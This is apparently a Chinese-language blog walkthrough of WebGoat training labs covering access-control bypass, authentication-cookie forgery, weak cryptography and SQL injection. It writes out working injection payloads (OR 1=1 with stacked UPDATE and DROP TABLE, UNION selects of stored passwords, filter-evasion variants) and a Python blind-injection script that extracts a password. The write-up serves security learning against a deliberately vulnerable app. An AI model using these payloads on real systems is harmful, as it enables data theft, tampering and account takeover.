<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129173020328.png" alt="image-20231129173020328"></p>
<p>之后呢，提示让我们修改方法和路径去修改他的信息。想到常用的四个方法<code>GET</code> <code>POST</code> <code>PUT</code> <code>DELETE</code> 肯定试试<code>PUT</code> 噻。</p>
<p>修改方法，修改Content-Type(好让后端识别噻), 修改payload，注意json格式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129174425912.png" alt="image-20231129174425912"></p>
<p>成功返回修改信息。</p>
<h2 id="Missing-Function-Level-Access-Control"><a href="#Missing-Function-Level-Access-Control" class="headerlink" title="Missing Function Level Access Control"></a>Missing Function Level Access Control</h2><p>我目前来说理解是函数级别的访问控制，因为一个系统会存在很多的业务函数调用，所以访问控制必须在每一个函数里面执行。同时这种函数级别的访问控制和上面的IDOR（不安全的直接对象引用）不能归为一类，IDOR更像是一种横向的越权，即，这个用户可以访问和他权限相等的用户的信息。</p>
<ul>
<li>第一个就是发现有没有通过前端直接进行隐藏的按钮,F12打开审查元素，用左上角的那个工具一个模块一个模块地搜索发现还真有，然后注释掉他的class就能看到隐藏的几个按钮，提交就行</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129191216508.png" alt="image-20231129191216508"></p>
<p>通过之后给了个提示，所以把url保存一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129191506203.png" alt="image-20231129191506203"></p>
<ul>
<li><p>之后需要我们获得所有用户的信息然后输入Jerry信息中的userHash。想起之前的到的url：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129193017274.png" alt="image-20231129193017274"></p>
</li>
</ul>
<p>但是报错404，但是给了这个路径肯定有用，后面把他试出来了，真正的url应为<code>http://192.168.52.133:8080/WebGoat/access-control/users</code></p>
<p>但是还是报错500，经典的Spring的内部错误。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129193215536.png" alt="image-20231129193215536"></p>
<p>这种情况无外乎是内部函数报错或者是我们传的参数不对。考虑到前后端基本都是json格式交互数据，所以改一个报头，<code>content-type: application/json</code>，之后就正确返回数据了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129193353850.png" alt="image-20231129193353850"></p>
<p>把userhash填进去这就过关了。</p>
<ul>
<li>之后他说公司修复了这个漏洞，不仅管理员可以查看用户了，所以我们使用<code>http://192.168.52.133:8080/access-control/users-admin-fix</code>这个接口试试。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129194756877.png" alt="image-20231129194756877"></p>
<p>所以考虑如何提权，看到hint，使用POST方法可以更改权限，就更改我们当前的权限就行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202035604.png" alt="image-20231129202035604"></p>
<p>之后再Get一下，就可以得到信息了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202027351.png" alt="image-20231129202027351"></p>
<h1 id="Spoofing-an-Authentication-Cookie"><a href="#Spoofing-an-Authentication-Cookie" class="headerlink" title="Spoofing an Authentication Cookie"></a>Spoofing an Authentication Cookie</h1><ul>
<li>登录查看他们的差别</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202222089.png" alt="image-20231129202222089"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202318320.png" alt="image-20231129202318320"></p>
<p>得到这两个：</p>
<p><code>NGY2ZTY3NTY3NjdhNDU3MDU3NjY2ZTY5NmQ2NDYx</code></p>
<p><code>NGY2ZTY3NTY3NjdhNDU3MDU3NjY3NDYxNmY2NzYyNjU3Nw==</code></p>
<p>很像base64编码，解码看看呢</p>
<p><code>4f6e6756767a457057666e696d6461</code></p>
<p><code>4f6e6756767a4570576674616f67626577</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202532369.png" alt="image-20231129202532369"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202622710.png" alt="image-20231129202622710"></p>
<p>前面是一样的，但是就是后面有点区别，使用十六进制解码再看看</p>
<p>解码得到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202848244.png" alt="image-20231129202848244"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129202909124.png" alt="image-20231129202909124"></p>
<p>发现<code>OngVvzEpWf</code>是固定的，但是后面的就为username的镜像，所以<code>tom</code>的spoof_auth&#x3D;<code>OngVvzEpWfmot</code>进行文本编码再base64得到:<code>NGY2ZTY3NTY3NjdhNDU3MDU3NjY2ZDZmNzQ=</code>, 输入到包中进行登录就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129203351342.png" alt="image-20231129203351342"></p>
<h1 id="A2-Cryptographic-Failures"><a href="#A2-Cryptographic-Failures" class="headerlink" title="(A2) Cryptographic Failures"></a>(A2) Cryptographic Failures</h1><p>这一节基本都是对密码学的一个科普，基本上都学过所以没什么好说的。</p>
<ul>
<li>首先是一个base64编码。</li>
</ul>
<p>直接用base64解码就行</p>
<ul>
<li><p>第二个是一个异或编码，但是要牵扯到密钥我就不知道这个怎么弄了。</p>
<p><code>Oz4rPj0+LDovPiwsKDAtOw==</code></p>
</li>
</ul>
<p>我们知道流程就行，就是吧明文的每一位转为二进制，再与密钥的二进制进行异或，得到的结果再base64就好，所以在得知密钥为<code>_</code>的情况下我们来进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">text = <span class="string">&quot;Oz4rPj0+LDovPiwsKDAtOw==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1</span></span><br><span class="line">text1 = base64.b64decode(text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base64 decode========&gt;&quot;</span>,text1)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;_&#x27;</span></span><br><span class="line">ch = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text1:</span><br><span class="line">    tmp = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(key))</span><br><span class="line">    ch.append(tmp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(ch))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130113656798.png" alt="image-20231130113656798"></p>
<ul>
<li>第三个就是一个哈希的科普，具体哈希的内容可以看看seed的实验，我博客里也有。</li>
</ul>
<p>这一节的作业就是使用hash碰撞找到他们的明文：</p>
<p><code>21232F297A57A5A743894A0E4A801FC3</code></p>
<p><code>2BB80D537B1DA3E38BD30361AA855686BDE0EACD7162FEF6A25FE97BF527A25B</code></p>
<p>看到哈希可以想到并不安全的MD5，网上都有做好的彩虹表，我们直接在线碰撞就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130114114200.png" alt="image-20231130114114200"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130114133375.png" alt="image-20231130114133375"></p>
<ul>
<li><p>第四个是一个对于对称加密和非对称加密的科普哈，都学过的，直接pass</p>
</li>
<li><p>第五个是一个签名的东西，首先要生成一个公钥，我们使用openssl进行生成</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkey -in rsa.pem -pubout</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130124741324.png" alt="image-20231130124741324"></p>
</li>
</ul>
<p>生成的公钥通过：<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptrsakeyparse">http://tool.chacuo.net/cryptrsakeyparse</a> 去解析里面的模数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130125633843.png" alt="image-20231130125633843"></p>
<p>之后利用私钥，对这个模数进行签名：</p>
<p>有个BUG就是文中没有提到用的哈希算法是什么所以就用最常用的SHA-256试试，这个也是现在TLS里面用到的哈希算法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130133558154.png" alt="image-20231130133558154"></p>
<ul>
<li>第六个说到了密钥管理的方面。</li>
</ul>
<p>启动一个docker：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130134410452.png" alt="image-20231130134410452"></p>
<p>进入docker里</p>
<p>执行几个命令就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231130140134992.png" alt="image-20231130140134992"></p>
<h1 id="A3-Injection"><a href="#A3-Injection" class="headerlink" title="(A3)Injection"></a>(A3)Injection</h1><h2 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a>SQL Injection (intro)</h2><h3 id="第二页"><a href="#第二页" class="headerlink" title="第二页"></a>第二页</h3><p>普通的sql语句，很简单</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203011243053.png" alt="image-20231203011243053"></p>
<h3 id="第三页"><a href="#第三页" class="headerlink" title="第三页"></a>第三页</h3><p>主要介绍数据操作语言</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203011423543.png" alt="image-20231203011423543"></p>
<h3 id="第四页"><a href="#第四页" class="headerlink" title="第四页"></a>第四页</h3><p>数据定义语言</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203011725571.png" alt="image-20231203011725571"></p>
<h3 id="第五页"><a href="#第五页" class="headerlink" title="第五页"></a>第五页</h3><p>数据控制语言</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231203011958515.png"></p>
<h3 id="第九页"><a href="#第九页" class="headerlink" title="第九页"></a>第九页</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203012216635.png" alt="image-20231203012216635"></p>
<h3 id="第十页"><a href="#第十页" class="headerlink" title="第十页"></a>第十页</h3><p>一个字符型注入，加一个条件就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203012741519.png" alt="image-20231203012741519"></p>
<h3 id="第十一页"><a href="#第十一页" class="headerlink" title="第十一页"></a>第十一页</h3><p>发现可以拼接，加一个or 1&#x3D;1的条件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203013006287.png" alt="image-20231203013006287"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203013138454.png" alt="image-20231203013138454"></p>
<h3 id="第十二页"><a href="#第十二页" class="headerlink" title="第十二页"></a>第十二页</h3><p>看到TAN，可能是字符型注入，试试注释掉后面的并且添加or 1&#x3D;1,确实可以</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203013321747.png" alt="image-20231203013321747"></p>
<p>拼接我们自己的update语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>SL99A<span class="string">&#x27; or 1=1; update employees set salary=88888 where first_name=&#x27;</span>John<span class="string">&#x27; and last_name=&#x27;</span>Smith<span class="string">&#x27;; --</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203013559218.png" alt="image-20231203013559218"></p>
<h3 id="第十三页"><a href="#第十三页" class="headerlink" title="第十三页"></a>第十三页</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;DROP TABLE access_log;--</span></span><br></pre></td></tr></table></figure>

<p>拼接语句 删库跑路</p>
<h2 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a>SQL Injection (advanced)</h2><h3 id="第三页-1"><a href="#第三页-1" class="headerlink" title="第三页"></a>第三页</h3><p>网页回显了sql语句，直接拼接就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203114823275.png" alt="image-20231203114823275"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203114848903.png" alt="image-20231203114848903"></p>
<p>用union凭借另外一张表，注意字段数量不一样，所以添加1，2，3占位</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dave<span class="string">&#x27; or 1=1 union select userid,user_name,password,cookie,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,3 from user_system_data; --</span></span><br></pre></td></tr></table></figure>

<p>但是显示不出来，可能是限制了显示的行宽</p>
<p>那就使用<code>;</code>拼接SQL语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dave<span class="string">&#x27; or 1=1; select * from user_system_data;--</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203115721164.png" alt="image-20231203115721164"></p>
<p>输入dave的密码即可</p>
<h3 id="第五页-1"><a href="#第五页-1" class="headerlink" title="第五页"></a>第五页</h3><p>让我们进行sql注入，并且没有提示sql语句，所以只能盲猜了</p>
<p>先猜这个语句，我们只要有值返回就可以登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username.password from user where username =&#x27;Tom&#x27; and password =&#x27;passwd&#x27;;</span><br></pre></td></tr></table></figure>

<p>payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = tom</span><br><span class="line">password = 1&#x27;=&#x27;1&#x27; or 1=1--</span><br></pre></td></tr></table></figure>

<p>失败了</p>
<p>还有一个注册页面，抓包注入试试，应该是个注入点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203121740996.png" alt="image-20231203121740996"></p>
<p>写个脚本跑跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line">chars = printable</span><br><span class="line"></span><br><span class="line">vul_url = <span class="string">&quot;http://192.168.52.133:8080/WebGoat/SqlInjectionAdvanced/challenge&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;X-CKA9Eg0TRmmV0zKv2QxHKJSVDByRU4q-aOS28D&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        data = <span class="string">&quot;username_reg=tom&#x27;+and%20substr(password,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;--&amp;email_reg=aaa@qq.com&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        resp = requests.put(vul_url, data=data, headers=headers, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;already exists&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">if</span> temp == result:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203123833226.png" alt="image-20231203123833226"></p>
<p>登录吧</p>
<h2 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a>SQL Injection (mitigation)</h2><p>这一节说的是参数化传入的查询参数。让我想到seed实验的一张图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203124631054.png" alt="image-20231203124631054"></p>
<ul>
<li><input disabled="" type="checkbox"> mybatis如何防止sql注入的？</li>
<li><input disabled="" type="checkbox"> 参数化查询工作原理？</li>
</ul>
<h3 id="第五页-2"><a href="#第五页-2" class="headerlink" title="第五页"></a>第五页</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203130858554.png" alt="image-20231203130858554"></p>
<h3 id="第六页"><a href="#第六页" class="headerlink" title="第六页"></a>第六页</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203131844026.png" alt="image-20231203131844026"></p>
<h3 id="第九页-1"><a href="#第九页-1" class="headerlink" title="第九页"></a>第九页</h3><p>前端就把空格给过滤了，用单行注释就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dave&#x27;/**/or/**/1=1/**/union/**/select/**/userid,user_name,password,cookie,&#x27;1&#x27;,&#x27;2&#x27;,3/**/from/**/user_system_data;/**/--</span><br></pre></td></tr></table></figure>

<h3 id="第十页-1"><a href="#第十页-1" class="headerlink" title="第十页"></a>第十页</h3><p>做了空格和and or过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203133335416.png" alt="image-20231203133335416"></p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dave&#x27;/**/or/**/1=1/**/union/**/select/**/userid,user_name,password,cookie,&#x27;1&#x27;,&#x27;2&#x27;,3/**/from/**/user_system_data;/**/--</span><br></pre></td></tr></table></figure>

<p>但是发现select和from不见了，然后or还是可以用，但是要大写（一样的）</p>
<p>添加字符然后bypass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dave&#x27;/**/or/**/1=1/**/union/**/selselectect/**/userid,user_name,password,cookie,&#x27;1&#x27;,&#x27;2&#x27;,3/**/frfromom/**/user_system_data;/**/--</span><br></pre></td></tr></table></figure>

<h3 id="第十二页-1"><a href="#第十二页-1" class="headerlink" title="第十二页"></a>第十二页</h3><p>找到webgoat-prd的ip地址，通过order by漏洞，然后网页可以通过点击不同的标签来达到排序的效果，然后我们抓包看看传入的参数是什么。</p>
<p>一个get传入column按哪一行排列，试试可以在这个参数上可以做什么</p>
